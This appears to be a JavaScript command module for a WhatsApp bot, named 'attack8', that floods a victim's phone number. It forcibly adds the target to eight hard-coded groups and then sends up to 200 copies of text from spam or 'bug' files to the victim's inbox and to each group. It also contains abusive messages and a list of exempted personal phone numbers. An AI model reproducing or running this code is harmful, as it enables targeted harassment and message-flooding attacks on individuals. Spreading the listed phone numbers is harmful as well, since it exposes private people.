import { time } from 'console';
import fs from 'fs'
import moment from 'moment-timezone'
import { performance } from 'perf_hooks'


let handler = async (m, {  isurt,conn, args , command, text, usedPrefix }) => {

    let old = performance.now()
    let neww = performance.now()
    let speed = neww - old
    
    
        //if (!isurtadmin) throw `sᴏʀʀʏ ʏᴏᴜ ᴀʀᴇɴ'ᴛ ʙᴏᴛ ᴀᴅᴍɪɴ  \n \nⁱᶠ ʸᵒᵘ ᵗʰⁱⁿᵏ ᵗʰⁱˢ ⁱˢ ᵃ ᵐⁱˢᵗᵃᵏᵉ, ᵖˡᵉᵃˢᵉ ⁱⁿᶠᵒʳᵐ ᵗʰᵉ ʲᶠ ᵗᵉᵃᵐ.`
    
        moment.tz.setDefault("Asia/Colombo").locale("id");
    
        
    let victim = text.split("/")[0]
    let count = text.split("/")[1]


    if (!victim) throw `! Enter Victim number and count correctly\n[ ex :- .attack 94777777777/100 ]\n(Default count is 50)\n(Maximum count 100) \n \nɴᴏᴡ ʙᴏᴛ ʀᴇsᴘᴏɴsᴇ ᴛɪᴍᴇ : ${speed}ms`

    if (!count) { count = 50} 
    
    if (victim.includes (` `)) throw `no spaces`
    if (victim.length > 11) throw `! Incorrect Number`
    if (victim.length < 11) throw `! Incorrect Number`
    if (count > 100) throw `! High value, All Estimated messeges ==> 2 × ${count} = ${count *2} \n  \nPlease Enter amount less than 100 for the safty of bot number`
    
    if (victim.includes (`94778115292`)) throw `Are You Kidding me ? Are you commanding me to attack my creator? It will never happen.`
    if (victim.includes (`94741902800`)) throw `Are You Kidding me ?`
    if (victim.includes (`94714290151`)) throw `Are You Kidding me ? Are you going to destroy GAGANA 🄿🄰🅁🄰🅈🄰'🅂 samsung galaxy A22 5G ? It's not possible`
    if (victim.includes (`94712237369`)) throw `Are You Kidding me ?`
    if (victim.includes (`94781388610`)) throw `Are You Kidding me ?`
    if (victim.includes (`94763924392`)) throw `Are You Kidding me ?`
    if (victim.includes (`94740387449`)) throw `කන්නද  ඕනේ. දෙන්නේ කනපැලෙන්න`
    if (victim.includes (`94704166484`)) throw `Are You Kidding me ? He is our team member so fuck off bitch`
    if (victim.includes (`94724507665`)) throw `Are You Kidding me ?Do not sellam with him he is not a ese mese man`
    if (victim.includes (`94772601056`)) throw `Are You Kidding me ? Are you commanding me to attack my creator? It will never happen.`
    //if (victim.includes (`5292`)) throw `Are you going to destroy Dilshan's samsung galaxy s10+ ? It's not possible`
    //if (victim.includes (`7665`)) throw `Nice try :-) try again later` 
    if (victim.includes (`94777611095`)) throw `This is my number , fuck ?`
    
    let d2 = new Date(new Date + 3600000)
    
    let locale = 'ta-LK'
     // let spams = [`./Spam/text/text/spam.txt`,`./Spam/text/text/spam (copy 1).txt`,`./Spam/text/text/spam (copy 2).txt`,`./Spam/text/text/spam (copy 3).txt`,`./Spam/text/text/spam (copy 4).txt`,`./Spam/text/text/s.txt`,`./Spam/text/text/s2.txt`,`./Spam/text/text/s3.txt`,`./Spam/text/text/s4.txt`]
    let spams = ['./Spam/text/jf.txt']
     //let spams = ['./Spam/text/s.txt','./Spam/text/Bug 02.txt','./Spam/text/Bug 03.txt','./Spam/text/Bug 04.txt' , './Spam/text/Bug 05.txt' , './Spam/text/Spam 01.txt' , './Spam/text/Spam 03.txt']
    let time = d2.toLocaleTimeString(locale, {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric'
        })
    
    
    
    let victim2 = victim.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
    //await conn.sendMessage(`94772601056@s.whatsapp.net`   , { text : `Bot spamming to ${victim2}` } , { quoted: m } )
    await conn.sendMessage(`120363027361171549@g.us`, { text : `Bot spamming to ${victim}  `} , { quoted: m } )
    
     /* while (i < count) {
    
     await conn.sendText(victim2, textx)
    
     i++
    
     } */
    
    let d = `${moment.tz('Asia/Colombo').format('YY/MM/DD')}`
    
    
    let i2 = 0;
    
     // await conn.groupParticipantsUpdate (`120363042414339652@g.us` , [victim], 'add')
    
     // let groupsx = [`120363042283397418@g.us`,`120363041793802829@g.us`]



    let group1 = `120363044155132786@g.us`
    let group2 = `120363024966599049@g.us`
    let group3 = `120363045284411411@g.us`
    let group4 = `120363044645355122@g.us`
    let group5 = `120363026760418389@g.us`
    let group6 = `120363042698763005@g.us`
    let group7 = `120363042685567742@g.us`
    let group8 = `120363042815494246@g.us`
    //let group9 = `120363043441253306@g.us`
    //let group10 = `120363044691876433@g.us`
    //let group11 = `120363043720042566@g.us`
    //let group12 = `120363043789789961@g.us`
    //let group13 = `120363043304215866@g.us`
    //let group14 = `120363027926958491@g.us`
    //let group15 = `120363044505973998@g.us`
    //let group16 = `120363043190930622@g.us`
    



     await conn.sendMessage(m.chat, { text : `ᴀᴅᴅɪɴɢ **8 ɢʀᴏᴜᴘꜱ && ꜱᴇɴᴅɪɴɢ **${count *2} ꜱᴘᴀᴍꜱ...` } , { quoted: m } )
     //await conn.sendMessage(m.chat, { text : `Sorry !!!! Groups adding system has been temporarily stopped by the developer. SENDING **${count *2} SPAM...to INBOX` } , { quoted: m } )
    
     /*await conn.groupUpdateDescription(group1, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)
    
     await conn.groupUpdateDescription(group2, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)
    
     await conn.groupUpdateDescription(group3, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)
    
     await conn.groupUpdateDescription(group4, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)
    
     await conn.groupUpdateDescription(group5, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)
    
     await conn.groupUpdateDescription(group6, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)
    
     await conn.groupUpdateDescription(group7, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

     await conn.groupUpdateDescription(group8, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)*/
    
     //await conn.groupUpdateDescription(group9, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)
    
     //await conn.groupUpdateDescription(group10, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

     //await conn.groupUpdateDescription(group11, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

     //await conn.groupUpdateDescription(group12, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

     //await conn.groupUpdateDescription(group13, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

     //await conn.groupUpdateDescription(group14, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

     //await conn.groupUpdateDescription(group15, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

     //await conn.groupUpdateDescription(group16, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)
    
    
    
    
    
    
    
    
        
        await conn.groupParticipantsUpdate(group1, [victim2], 'add') 
        await conn.groupParticipantsUpdate(group2, [victim2], 'add')
        await conn.groupParticipantsUpdate(group3, [victim2], 'add')
        await conn.groupParticipantsUpdate(group4, [victim2], 'add')

        await conn.groupParticipantsUpdate(group5, [victim2], 'add')
        await conn.groupParticipantsUpdate(group6, [victim2], 'add')
        await conn.groupParticipantsUpdate(group7, [victim2], 'add')
        await conn.groupParticipantsUpdate(group8, [victim2], 'add')
       
        //await conn.groupParticipantsUpdate(group9, [victim2], 'add')
        //await conn.groupParticipantsUpdate(group10, [victim2], 'add')
        //await conn.groupParticipantsUpdate(group11, [victim2], 'add')
        //await conn.groupParticipantsUpdate(group12, [victim2], 'add')

        //await conn.groupParticipantsUpdate(group13, [victim2], 'add')
        //await conn.groupParticipantsUpdate(group14, [victim2], 'add')
        //await conn.groupParticipantsUpdate(group15, [victim2], 'add')
        //await conn.groupParticipantsUpdate(group16, [victim2], 'add')

    
    
    
         await conn.sendMessage(m.chat, { text : `ꜱᴇɴᴅɪɴɢ **${count *2} ꜱᴘᴀᴍꜱ...` } , { quoted: m } )
    
    while (i2 < count * 2 ) {
    
    
        let spam1 =  spams[Math.floor(Math.random() * spams.length)]
    
    
    let textx = fs.readFileSync(`${spam1}`)
    
       
    
        //await conn.sendText(victim2, textx)
        
        
       await conn.sendMessage(victim2, { text : `${textx}` })
       //await conn.sendButton(victim2, `${textx}`, `${textx}`, [`${textx}`], m)
       
       
       await conn.sendMessage(group1, { text : `${textx}` })
       await conn.sendMessage(group2, { text : `${textx}` })
       await conn.sendMessage(group3, { text : `${textx}` })
       await conn.sendMessage(group4, { text : `${textx}` })
    
       
    
       await conn.sendMessage(group5, { text : `${textx}` }) 
       await conn.sendMessage(group6, { text : `${textx}` })
       await conn.sendMessage(group7, { text : `${textx}` })
       await conn.sendMessage(group8, { text : `${textx}` })

       //await conn.sendMessage(group9, { text : `${textx}` })
       //await conn.sendMessage(group10, { text : `${textx}` })
       //await conn.sendMessage(group11, { text : `${textx}` })
       //await conn.sendMessage(group12, { text : `${textx}` })

       //await conn.sendMessage(group13, { text : `${textx}` })
       //await conn.sendMessage(group14, { text : `${textx}` })
       //await conn.sendMessage(group15, { text : `${textx}` })
       //await conn.sendMessage(group16, { text : `${textx}` })
    
    
        //await conn.sendText(group2, textx)
        // conn.sendText(m.chat, textx , m)
    
        
        i2++
     
    
    
    }
    
    
    
    
       /*await conn.sendMessage(m.chat, { text : `Removing Groups` } , { quoted: m } )
    
    
         await conn.groupParticipantsUpdate(group1, [victim2], 'remove') 
         await conn.groupParticipantsUpdate(group2, [victim2], 'remove')
         await conn.groupParticipantsUpdate(group3, [victim2], 'remove')
         await conn.groupParticipantsUpdate(group4, [victim2], 'remove')
  
         await conn.groupParticipantsUpdate(group5, [victim2], 'remove')
         await conn.groupParticipantsUpdate(group6, [victim2], 'remove')
         await conn.groupParticipantsUpdate(group7, [victim2], 'remove')
         await conn.groupParticipantsUpdate(group8, [victim2], 'remove')*/
        
         //await conn.groupParticipantsUpdate(group9, [victim2], 'remove')
         //await conn.groupParticipantsUpdate(group10, [victim2], 'remove')
         //await conn.groupParticipantsUpdate(group11, [victim2], 'remove')
         //await conn.groupParticipantsUpdate(group12, [victim2], 'remove')
        
         //await conn.groupParticipantsUpdate(group13, [victim2], 'remove')
         //await conn.groupParticipantsUpdate(group14, [victim2], 'remove')
         //await conn.groupParticipantsUpdate(group15, [victim2], 'remove')
         //await conn.groupParticipantsUpdate(group16, [victim2], 'remove')

    
        await conn.sendMessage(m.chat, { text : `Succesfully sent ${count * 2} spam to number wa.me/${victim} \n \nBOT LATENCY : ${speed}ms `} , { quoted: m } )
    
        //await fs.writeFileSync('./Media/victims.json', JSON.stringify(`Number : wa.me/${victim} Count : ${count * 2} `))
    //await conn.sendText(m.chat , `Succesfully spammed number wa.me/${victim}`)
    //await conn.sendMessage(`94772601056@whatsapp.net`, { text : `Succesfully spammed ${count} number wa.me/${victim}` } , { quoted: m } )
    // await conn.sendText(`94778115292@whatsapp.net` , `Succesfully spammed number wa.me/${victim}`)
     
    }
    
    
    
    handler.command = /^(attack8)$/i
    export default handler
    handler.premium = true 